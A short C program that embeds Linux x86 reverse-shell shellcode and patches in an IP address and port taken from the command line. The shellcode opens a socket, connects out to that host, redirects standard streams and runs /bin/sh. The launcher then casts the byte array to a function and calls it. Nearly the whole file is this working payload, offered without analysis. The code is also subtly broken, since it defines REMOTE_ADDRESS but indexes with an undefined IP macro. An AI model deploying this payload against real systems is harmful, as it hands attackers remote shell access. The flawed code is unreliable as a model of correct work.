#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>

#define PORT 27
#define REMOTE_ADDRESS 21

int main(int argc, char *argv[])
{

unsigned char shellcode[] = \
"\x31\xc0\xf7\xe2\x52\x89"
"\xd3\x43\x53\x6a\x02\x89"
"\xe1\xb0\x66\xcd\x80\x89"
"\xc7\x5b\x68"
"\xc0\xa8\xc8\x04"  // IP
"\x66\x68"
"\x04\xd2"   // PORT
"\x66\x53\x89\xe1\x6a\x10"
"\x51\x57\x89\xe1\x43\xb0"
"\x66\xcd\x80\x89\xfb\x31"
"\xc9\xb0\x3f\xcd\x80\x41"
"\x66\x83\xf9\x02\x7e\xf5"
"\x31\xc0\x50\x68\x2f\x2f"
"\x73\x68\x68\x2f\x62\x69"
"\x6e\x89\xe3\x50\x89\xe2"
"\x53\x89\xe1\xb0\x0b\xcd"
"\x80";

// provide binary form of the IP into the shellcode in order to be able to connect to that specific IP address
unsigned ipaddress = inet_addr(argv[1]);

// copy the IP in the right shellcode offset 21 bytes from the beginning of the shellcode
memcpy(&shellcode[IP], &ipaddress, 4);

// provide binary form of the port into the shellcode in order to be able to connect to that specific port
unsigned int port = htons(atoi(argv[2]));

// copy the new port in the right shellcode offset 27 bytes from the beginning of the shellcode
memcpy(&shellcode[PORT], &port, 2);

printf("Shellcode Length: %d\n", strlen(shellcode));

int (*ret)() = (int(*)())shellcode;

ret();

}
